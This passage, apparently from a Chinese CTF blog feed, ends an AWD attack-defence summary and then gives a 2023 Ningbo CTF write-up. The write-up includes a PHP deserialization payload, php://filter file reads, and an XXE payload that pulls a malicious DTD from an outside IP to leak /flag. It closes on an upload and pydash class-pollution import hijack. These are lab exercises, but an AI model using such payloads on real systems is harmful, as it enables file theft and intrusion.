class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##修改cat的别名</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">&quot;echo `date`|md5sum|cut -d &#x27; &#x27; -f1||&quot;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">&quot;printf &#x27;flag&#123;%s&#125;&#x27; <span class="hljs-subst">$(date | md5sum | cut -d &#x27; &#x27; -f1)</span>&quot;</span><br><br><br><span class="hljs-comment">##去除别名</span><br><span class="hljs-built_in">unalias</span> -a<br></code></pre></td></tr></table></figure><h2 id="pwn防御"><a href="#pwn防御" class="headerlink" title="pwn防御"></a>pwn防御</h2><h4 id="打patch"><a href="#打patch" class="headerlink" title="打patch"></a>打patch</h4><p>参考：<a href="https://q1iq.top/IDA-patch">https://q1iq.top/IDA-patch</a></p><h4 id="上通防"><a href="#上通防" class="headerlink" title="上通防"></a>上通防</h4><p>现在大部分比赛不允许上通防，因为通防基本可以实现完美防御</p><p>通防是通用防御的简称。因为awd里pwn题的形式基本都是运行一个二进制，然后把二进制的流量转发到某个端口，所以如果给这个pwn题加个壳子过滤一下流量，所有带flag的字符串都不允许输出，所有带flag的文件都不允许打开，基本上就没办法攻击了。</p><p>以下是几个通防项目</p><p><a href="https://github.com/rip1s/PwnSandboxForCTF">PwnSandboxForCTF</a>：Ptrace，劫持敏感syscall，检查参数过滤敏感字符串</p><p><a href="https://github.com/TTY-flag/evilPatcher">evilPatcher</a>：Seccomp沙盒，劫持syscall，无法过滤指针类参数</p><p><a href="https://github.com/I0gan/pwn_waf">pwn_waf</a>：抓取流量、通防、转发、多人转发模式，</p><p><a href="https://lief-project.github.io/download/">LIEF</a>：劫持敏感函数调用，过滤敏感字符串等。对原文件改动较小</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;攻击&quot;&gt;&lt;a href=&quot;#攻击&quot; class=&quot;headerlink&quot; title=&quot;攻击&quot;&gt;&lt;/a&gt;攻击&lt;/h1&gt;&lt;h2 id=&quot;主机发现&quot;&gt;&lt;a href=&quot;#主机发现&quot; class=&quot;headerlink&quot; title=&quot;主机发现&quot;&gt;&lt;/a&gt;主机发现&lt;/h</summary>
      
    
    
    
    <category term="awd" scheme="https://www.lewiserii.top/categories/awd/"/>
    
    
    <category term="awd" scheme="https://www.lewiserii.top/tags/awd/"/>
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>2023宁波市赛wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9Bwp.html</id>
    <published>2023-05-20T06:00:00.000Z</published>
    <updated>2023-05-25T16:03:28.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h2><p>sqlmap一把梭</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/Query.png"></p><h2 id="Deserialization"><a href="#Deserialization" class="headerlink" title="Deserialization"></a>Deserialization</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//The location of the flag is at route.php</span><br><span class="hljs-variable">$read</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;read&quot;</span>];<br><span class="hljs-variable">$input</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;input&quot;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$read</span>) <span class="hljs-keyword">or</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$read</span>, <span class="hljs-string">&quot;f14g&quot;</span>)===<span class="hljs-literal">FALSE</span>)<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$read</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$input</span>);<br>    <span class="hljs-variable">$input2</span> = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$input</span>;<br>    <span class="hljs-variable">$input2</span>-&gt;position = <span class="hljs-string">&quot;route.php&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>php://filter</code>读<code>route.php</code></p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;h1&gt;Here can you find the position of the flag!&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$position</span> = <span class="hljs-string">&quot;f14g.php&quot;</span>;<br><span class="hljs-variable">$gadget</span> = <span class="hljs-string">&quot;h1nt.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>再读<code>h1nt.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$position</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;position);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;position;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化，调用<code>__clone</code>方法时读<code>f14g.php</code><br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$position</span>=<span class="hljs-string">&#x27;f14g.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//read=h1nt.php&amp;input=O:4:&quot;test&quot;:1:&#123;s:8:&quot;position&quot;;s:8:&quot;f14g.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="CodeCheck"><a href="#CodeCheck" class="headerlink" title="CodeCheck"></a>CodeCheck</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;***********&quot;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">or</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])!== <span class="hljs-string">&quot;flag&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])!==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>php://input</code>使得a的值为<code>flag</code>，b同理，d使用<code>php://filter</code>读文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/CodeCheck.png"></p><h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>访问靶机自动跳转到<code>/parser?body=%7B&quot;1&quot;%3A&quot;2&quot;%7D</code>，并返回<code>json</code><br>访问<code>/parser?body=1</code>，返回<code>plain</code></p><p>猜测这是一个类型解析器，可以解析输入的数据类型并返回</p><p>fuzz后发现支持xml格式，尝试利用xxe漏洞。因为是java环境，尝试使用<code>jar协议</code>，<a href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html#jar-x2F-x2F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">原理参考</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-1.png"></p><p>vps上用flask构建一个恶意dtd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;!ENTITY % c SYSTEM <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;<br>&lt;!ENTITY % a <span class="hljs-string">&quot;&lt;!ENTITY remote SYSTEM &#x27;jar:http://20.2.129.79/1.zip!/%c;&#x27;&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>在apache上放一个1.zip，内容随意</p><p>当<code>jar协议</code>在<code>1.zip</code>中找不到<code>file://</code>中指定的文件时就会报错，通过报错回显文件内容</p><p>且过滤了<code>&quot;http</code>，可以使用<code>&quot;url:http</code>来绕过</p><p>最终payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;url:http://20.2.129.79:7777/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %b;</span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-2.png"></p><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>打开靶机后有一个文件上传功能</p><p>但是对路径，后缀，文件内容进行了检测</p><p>路径中过滤了<code>..</code>，不能进行目录穿越，只能存放在<code>/tmp/</code>下，·且后缀检查的黑名单较严格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_path</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span> = [<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&#x27;\.\.&#x27;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$black_list</span>) . <span class="hljs-string">&#x27;)/i&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$path</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_extension</span>(<span class="hljs-params"><span class="hljs-variable">$extension</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;php3&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;phtml&#x27;</span>, <span class="hljs-string">&#x27;py&#x27;</span>, <span class="hljs-string">&#x27;pl&#x27;</span>,<span class="hljs-string">&#x27;pyc&#x27;</span>,<span class="hljs-string">&#x27;php7&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;ini&#x27;</span>,<span class="hljs-string">&#x27;htaccess&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$extension</span>),<span class="hljs-variable">$black_list</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">up_base64</span>(<span class="hljs-params"><span class="hljs-variable">$file_path</span>, <span class="hljs-variable">$base64</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(data:\s*image\/(\w*);base64,)/&#x27;</span>, <span class="hljs-variable">$base64</span>, <span class="hljs-variable">$result</span>)) &#123;<br><br>        <span class="hljs-variable">$type</span> = <span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">check_extension</span>(<span class="hljs-variable">$type</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-title function_ invoke__">time</span>() . <span class="hljs-string">&quot;/&quot;</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$res</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$res</span>, <span class="hljs-number">0777</span>);<br>        &#125;<br>        <span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;    <span class="hljs-comment">//图片名以时间命名</span><br>        <span class="hljs-comment">//保存为文件</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$newFile</span>, <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$result</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$base64</span>)))) &#123;<br>            <span class="hljs-comment">//返回这个图片的路径</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$newFile</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;base64&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_path</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">up_base64</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>], <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$res</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;upload success&lt;/h1&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Hacker!&lt;/h1&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>同时扫描网址发现存在<code>/app</code>路由</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> challenge <span class="hljs-keyword">import</span> challenge<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">value: <span class="hljs-built_in">str</span></span>):<br>    black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span class="hljs-string">&quot;__spec__&quot;</span>]<br>    <span class="hljs-keyword">if</span> re.findall(<span class="hljs-string">&quot;r&#x27;[^\w\.\[\]]&#x27;&quot;</span>, value):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> black_list:<br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> value:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/set&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set</span>():<br>    key, value = request.json.get(<span class="hljs-string">&#x27;key&#x27;</span>), request.json.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> key <span class="hljs-keyword">or</span> <span class="hljs-built_in">type</span>(key) != <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Not key or key must be str&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) &gt; <span class="hljs-number">100</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Key may be too long!&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(value) &gt; <span class="hljs-number">20</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Value may  be too long!&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> value:<br>        game.complete(value)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Key set success !&quot;</span>&#125;, <span class="hljs-number">200</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value) != <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Value must be a string!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check(key):<br>        <span class="hljs-built_in">print</span>(key)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hacker!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    <span class="hljs-comment"># pydash?</span><br>    <span class="hljs-keyword">if</span> game.<span class="hljs-built_in">set</span>(key, value):<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Task updated!&quot;</span>&#125;, <span class="hljs-number">200</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid task name!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_source</span>():<br>    fp = <span class="hljs-built_in">open</span>(__file__)<br>    res = fp.read()<br>    fp.close<br>    <span class="hljs-keyword">return</span> res.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot; &quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/get&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_date</span>():<br>    <span class="hljs-keyword">import</span> backdoor<br>    flag = backdoor.backdoor()<br>    sys.modules.pop(<span class="hljs-string">&quot;backdoor&quot;</span>)<br>    <span class="hljs-keyword">return</span> flag<br><br><br>game = challenge()<br>app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">3000</span>)<br></code></pre></td></tr></table></figure><p>其中有三个路由</p><p><code>/app</code>显示当前代码<br><code>/app/get</code>存在后门，有导入包的操作<br><code>/app/set</code>用于设置键值对</p><p>其中存在提示<code># pydash?</code>，表示通过<code>pydash</code>设置属性，而<code>pydash</code>低版本存在类污染，可以利用<code>pydash.set</code>来设置或覆盖属性值，也可以设置路径</p><p>在<code>/app/get</code>路由中存在一个<code>import</code>的操作，当<code>Python</code>解释器遇到<code>import</code>语句时，它会在<code>sys.path</code>变量中指定的路径中搜索模块，其中<code>sys.path[0]</code>则表示最初调用<code>Python</code>解释器的脚本所在的绝对路径</p><p>所以我们可以上传一个名称为<code>backdoor</code>的py文件，再利用<code>pydash.set</code>覆盖<code>sys.path[0]</code>的值，使其寻找包时找到我们的恶意包</p><p>同时题目中还存在一个waf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span 